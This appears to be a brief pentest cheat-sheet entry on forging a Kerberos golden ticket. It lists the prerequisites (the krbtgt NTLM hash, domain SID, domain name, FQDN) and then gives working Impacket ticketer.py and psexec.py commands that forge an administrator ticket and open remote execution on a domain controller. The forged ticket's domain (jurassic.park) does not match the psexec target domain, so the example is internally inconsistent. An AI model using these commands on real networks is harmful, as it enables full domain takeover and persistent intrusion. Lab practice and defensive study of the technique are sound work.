### Requirements
- Knowledge of the domain name
- Knowledge of the domain SID
- The NTLM hash of the krbtgt account
- FQDN

```shell
ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park administrator

export KRB5CCNAME=administrator.ccache

psexec.py north.sevenkingdoms.local/administrator@WINTERFELL.north.sevenkingdoms.local -k -no-pass
```


